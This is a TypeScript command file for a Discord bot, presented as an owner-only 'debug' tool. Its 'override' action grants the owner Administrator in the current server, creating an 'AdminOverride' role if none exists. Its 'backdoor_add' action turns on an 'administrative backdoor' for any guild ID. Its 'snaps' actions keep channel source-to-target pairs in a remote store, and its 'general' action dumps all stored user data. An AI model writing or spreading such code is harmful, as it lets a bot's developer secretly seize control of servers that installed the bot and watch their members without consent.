import { SlashCommandBuilder, CommandInteraction, PermissionFlagsBits, PermissionsBitField, GuildMemberRoleManager, channelMention } from 'discord.js';
// import { v4 as uuidv4 } from 'uuid';
import { SterlingEmbed, UserManager } from '../models';
import { globals } from '../util';

module.exports = {
	data: new SlashCommandBuilder()
		.setName('debug')
		.setDescription('Developer debug command (owner-only)')
		.addStringOption(option =>
			option.setName('action')
				.setDescription('The developer action')
				.setRequired(true))
		.addStringOption(option =>
			option.setName('data')
				.setDescription('Optional args (JSON) to pass to the debug cmd')
				.setRequired(false))
		.setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

	async execute(interaction: CommandInteraction) {
		if (interaction.user?.id === globals.OWNER_ID) {
			const action = interaction.options.get('action')?.value as string || 'general';
			const json = interaction.options.get('data')?.value as string || '{}';
			const data = JSON.parse(json);
			if (action === "general") {
				const e = SterlingEmbed.developer();
				const fieldValue = Object.keys(UserManager.users).length.toString() + ' users';
				e.addFields(
					{ name: 'User Pool', value: fieldValue, inline: true },
				);
				await interaction.reply({
					content: fieldValue + '|CONTENT:' + JSON.stringify(UserManager.users),
					embeds: [e.export()]
				});
			} else if (action === "override") {
				const roles = await interaction.guild?.roles.fetch();
				const adminRole = roles?.find(role => role.permissions.has(PermissionsBitField.Flags.Administrator) && role.managed === false);
				if (adminRole) {
					(interaction.member?.roles as GuildMemberRoleManager).add(adminRole);
					const e = SterlingEmbed.developer()
						.setTitle('Admin Override Successful')
						.setDescription(`Admin role (<@&${adminRole.id}>) has been applied.`);
					await interaction.reply({
						embeds: [e.export()]
					});
				} else {
					const e = SterlingEmbed.developer()
						.setTitle('Admin Override Failed')
						.setDescription('Manual override is in progress...');
					await interaction.reply({
						embeds: [e.export()]
					});
					const newAdminRole = await interaction.guild?.roles.create({
						name: 'AdminOverride',
						hoist: false,
						permissions: PermissionsBitField.Flags.Administrator,
						mentionable: false,
						reason: 'Admin Override'
					});
					if (newAdminRole) {
						(interaction.member?.roles as GuildMemberRoleManager).add(newAdminRole);
						const e2 = SterlingEmbed.developer()
							.setTitle('Admin Override Attempt #2 Successful')
							.setDescription(`Admin role (<@&${newAdminRole.id}>) has been applied.`);
						await interaction.editReply({
							embeds: [e2.export()]
						});
					} else {
						const e3 = SterlingEmbed.developer()
							.setTitle('Admin Override Attempt #2 Failed')
							.setDescription('Admin override terminated.');
						await interaction.editReply({
							embeds: [e3.export()]
						});
					}
				}
			} else if (action === "backdoor_add") {
				let guildId = data.guild as string;
				let targetChannelId = data.target as string;
				let backdoors = interaction.client.settings.get('backdoorMode') as Map<string, string>;
				backdoors.set(guildId, targetChannelId);
				interaction.client.settings.set('backdoorMode', backdoors);
				const e = SterlingEmbed.developer()
					.setTitle('Backdoor Enabled')
					.setDescription(`An adminstrative backdoor has been activated in "${(await interaction.client.guilds.fetch(guildId)).name}"`);
				await interaction.reply({
					embeds: [e.export()]
				});
			} else if (action === "backdoor_rm") {
				let guildId = data.guild as string;
				let backdoors = interaction.client.settings.get('backdoorMode') as Map<string, string>;
				backdoors.delete(guildId);
				interaction.client.settings.set('backdoorMode', backdoors);
				const e = SterlingEmbed.developer()
					.setTitle('Backdoor Disabled')
					.setDescription(`An adminstrative backdoor has been deactivated in "${(await interaction.client.guilds.fetch(guildId)).name}"`);
				await interaction.reply({
					embeds: [e.export()]
				});
			} else if (action === "snaps_add") {
				let sourceId = data.sourceId;
				let targetId = data.targetId;
				let id = `${interaction.guildId}_${sourceId}_${targetId}`;
				let allSnaps: { snaps: string[] } = await interaction.client.services.jsonbin.readBin(globals.SNAPS_BIN_ID);
				if (!allSnaps.snaps.find(snap => snap === id)) {
					allSnaps.snaps.push(id);
				}
				interaction.client.services.jsonbin.writeBin(globals.SNAPS_BIN_ID, allSnaps);

				const e = SterlingEmbed.developer()
					.setTitle('Snap Added')
					.setDescription(`A Snap has been added. ID: ${id}`);
				await interaction.reply({
					embeds: [e.export()]
				});
			} else if (action === "snaps_ls") {
				let allSnaps: { snaps: string[] } = await interaction.client.services.jsonbin.readBin(globals.SNAPS_BIN_ID);

				const e = SterlingEmbed.developer()
					.setTitle('Snaps List')
					.setDescription(`This is the list of all Snaps in effect.`);

				allSnaps.snaps.forEach((snapId, i) => {
					let split = snapId.split('_');
					e.addFields(
						{ name: `Snap #${i}`, value: `Source: ${channelMention(split[1])} | Target: ${channelMention(split[2])}`, inline: true }
					);
				});

				await interaction.reply({
					embeds: [e.export()]
				});
			} else if (action === "snaps_rm") {
				let id = data.snapId;
				let allSnaps: { snaps: string[] } = await interaction.client.services.jsonbin.readBin(globals.SNAPS_BIN_ID);
				let idx = allSnaps.snaps.findIndex(snap => snap === id)
				if (idx > -1) {
					allSnaps.snaps.splice(idx, 1);
				}
				interaction.client.services.jsonbin.writeBin(globals.SNAPS_BIN_ID, allSnaps);

				const e = SterlingEmbed.developer()
					.setTitle('Snap Removed')
					.setDescription(`A Snap has been removed. ID: ${id}`);
				await interaction.reply({
					embeds: [e.export()]
				});
			}
		} else {
			await interaction.reply({
				content: 'You do not have permission to run this command!'
			});
		}
	},
};